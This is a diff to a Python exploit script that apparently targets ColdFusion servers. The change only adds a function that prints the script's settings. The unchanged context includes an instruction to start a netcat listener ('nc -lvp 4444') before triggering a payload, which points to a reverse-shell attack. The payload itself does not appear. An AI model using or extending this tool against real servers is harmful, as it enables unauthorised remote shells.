@@ -22,6 +22,7 @@ import string
 def main():
     # process arguments
     args = process_args(argparse.ArgumentParser())
+    show_settings(args)
     request, targetfilename = init(args)
     check_response(request, args.basepath, targetfilename)
     input('[info] Make sure you have a listener active \n[info] (e.g. nc -lvp 4444) before triggering the payload\n<press any key>\n')
@@ -46,6 +47,13 @@ def process_args(parser):
     parser.add_argument('-b', dest='basepath', help='coldfusion basepath', default='')
     return parser.parse_args()
 
+
+def show_settings(args):
+    print('[info] Using following settings:')
+    print('-'*35)
+    for k,v in args.__dict__.items():
+        print(F'{str(k).ljust(10)}: {str(v).rjust(20)}')
+    print('-'*35)
 
 def init(args):
     host = args.target
